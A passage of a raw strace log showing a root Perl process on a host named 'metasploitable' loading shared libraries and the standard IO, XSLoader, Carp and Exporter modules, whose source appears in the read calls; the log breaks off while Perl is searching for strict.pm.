\2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
12710 07:43:45.400382 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
12710 07:43:45.400447 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e39000
12710 07:43:45.400494 mmap2(0xb7f82000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f82000
12710 07:43:45.400516 mmap2(0xb7f85000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f85000
12710 07:43:45.400548 close(1)          = 0
12710 07:43:45.400564 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
12710 07:43:45.400581 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
12710 07:43:45.400596 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
12710 07:43:45.400683 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
12710 07:43:45.400703 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e07000
12710 07:43:45.400714 mmap2(0xb7e10000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e10000
12710 07:43:45.400729 mmap2(0xb7e12000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7e12000
12710 07:43:45.400742 close(1)          = 0
12710 07:43:45.400765 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e06000
12710 07:43:45.400778 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e068c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
12710 07:43:45.400833 mprotect(0xb7f82000, 4096, PROT_READ) = 0
12710 07:43:45.400858 munmap(0xb7fca000, 29913) = 0
12710 07:43:45.400879 set_tid_address(0xb7e06908) = 12710
12710 07:43:45.400888 set_robust_list(0xb7e06910, 0xc) = 0
12710 07:43:45.400898 futex(0xbf8ef590, 0x81 /* FUTEX_??? */, 1) = 0
12710 07:43:45.400912 rt_sigaction(SIGRTMIN, {0xb7f8c2c0, [], SA_SIGINFO}, NULL, 8) = 0
12710 07:43:45.400925 rt_sigaction(SIGRT_1, {0xb7f8c340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
12710 07:43:45.400937 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
12710 07:43:45.400950 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
12710 07:43:45.400968 uname({sys="Linux", node="metasploitable", ...}) = 0
12710 07:43:45.401016 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
12710 07:43:45.401061 brk(0)            = 0x8153000
12710 07:43:45.401070 brk(0x8174000)    = 0x8174000
12710 07:43:45.401113 getuid32()        = 0
12710 07:43:45.401123 geteuid32()       = 0
12710 07:43:45.401132 getgid32()        = 0
12710 07:43:45.401140 getegid32()       = 0
12710 07:43:45.401176 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7de5000
12710 07:43:45.401204 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
12710 07:43:45.401220 read(1, "M\372\30$", 4) = 4
12710 07:43:45.401233 close(1)          = 0
12710 07:43:45.401251 time(NULL)        = 1495626225
12710 07:43:45.401291 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbf8ef260) = -1 ENOENT (No such file or directory)
12710 07:43:45.401308 stat64("/usr/local/lib/site_perl/5.8.8", 0xbf8ef260) = -1 ENOENT (No such file or directory)
12710 07:43:45.401321 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbf8ef260) = -1 ENOENT (No such file or directory)
12710 07:43:45.401336 stat64("/usr/local/lib/perl/5.8.7", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401348 stat64("/usr/local/share/perl/5.8.7", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401360 stat64("/usr/local/lib/perl/5.8.6", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401371 stat64("/usr/local/share/perl/5.8.6", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401383 stat64("/usr/local/lib/perl/5.8.4", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401441 stat64("/usr/local/share/perl/5.8.4", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401454 stat64("/usr/local/lib/perl/5.8.3", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401495 stat64("/usr/local/share/perl/5.8.3", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401507 stat64("/usr/local/lib/perl/5.8.2", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401519 stat64("/usr/local/share/perl/5.8.2", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401531 stat64("/usr/local/lib/perl/5.8.1", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401542 stat64("/usr/local/share/perl/5.8.1", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401567 stat64("/usr/local/lib/perl/5.8.0", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401578 stat64("/usr/local/share/perl/5.8.0", 0xbf8ef3a0) = -1 ENOENT (No such file or directory)
12710 07:43:45.401601 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ef098) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.401620 _llseek(0, 0, [0], SEEK_CUR) = 0
12710 07:43:45.401632 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ef098) = -1 EBADF (Bad file descriptor)
12710 07:43:45.401643 _llseek(1, 0, 0xbf8ef0e0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
12710 07:43:45.401653 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ef098) = -1 EINVAL (Invalid argument)
12710 07:43:45.401663 _llseek(2, 0, 0xbf8ef0e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
12710 07:43:45.401673 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
12710 07:43:45.401686 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ef158) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.401696 _llseek(1, 0, [0], SEEK_CUR) = 0
12710 07:43:45.401707 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
12710 07:43:45.401718 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
12710 07:43:45.401736 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
12710 07:43:45.401787 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
12710 07:43:45.401829 getppid()         = 12708
12710 07:43:45.401887 stat64("/etc/perl/IO.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.401888 stat64("/etc/perl/IO.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.401888 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.401888 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.401888 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.401889 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.401889 stat64("/usr/lib/perl5/IO.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.401901 stat64("/usr/lib/perl5/IO.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.401928 stat64("/usr/share/perl5/IO.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.401940 stat64("/usr/share/perl5/IO.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.401953 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.401965 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
12710 07:43:45.401985 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
12710 07:43:45.401999 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eeb68) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.402010 _llseek(6, 0, [0], SEEK_CUR) = 0
12710 07:43:45.402052 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
12710 07:43:45.402133 stat64("/etc/perl/XSLoader.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.402147 stat64("/etc/perl/XSLoader.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.402160 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.402172 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.402186 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.402199 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.402212 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.402224 stat64("/usr/lib/perl5/XSLoader.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.402241 stat64("/usr/share/perl5/XSLoader.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.402253 stat64("/usr/share/perl5/XSLoader.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.402266 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.402279 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
12710 07:43:45.402299 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.402312 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.402323 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.402340 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
12710 07:43:45.402570 brk(0x8195000)    = 0x8195000
12710 07:43:45.402917 _llseek(8, 3407, [3407], SEEK_SET) = 0
12710 07:43:45.402934 _llseek(8, 0, [3407], SEEK_CUR) = 0
12710 07:43:45.402944 close(8)          = 0
12710 07:43:45.402990 stat64("/etc/perl/Carp.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.403005 stat64("/etc/perl/Carp.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.403019 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.403032 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.403045 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.403058 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.403071 stat64("/usr/lib/perl5/Carp.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.403083 stat64("/usr/lib/perl5/Carp.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.403096 stat64("/usr/share/perl5/Carp.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.403108 stat64("/usr/share/perl5/Carp.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.403121 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.403201 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.403248 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.403261 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
12710 07:43:45.403281 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.403295 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.403306 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.403323 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
12710 07:43:45.403788 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
12710 07:43:45.409173 read(8, "", 4096) = 0
12710 07:43:45.409174 close(8)          = 0
12710 07:43:45.409174 stat64("/etc/perl/Exporter.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.409174 stat64("/etc/perl/Exporter.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.409174 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.409174 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.409180 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.409193 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.409207 stat64("/usr/lib/perl5/Exporter.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.409218 stat64("/usr/lib/perl5/Exporter.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.409231 stat64("/usr/share/perl5/Exporter.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.409243 stat64("/usr/share/perl5/Exporter.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.409256 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.409269 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.409282 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.409298 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
12710 07:43:45.409319 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.409334 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.409345 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.409362 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
12710 07:43:45.409941 _llseek(8, 2217, [2217], SEEK_SET) = 0
12710 07:43:45.409974 _llseek(8, 0, [2217], SEEK_CUR) = 0
12710 07:43:45.409984 close(8)          = 0
12710 07:43:45.410058 stat64("/etc/perl/strict.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410074 stat64("/etc/perl/strict.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410087 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410100 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410114 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.410126 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.410140 stat64("/usr/lib/perl5/strict.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
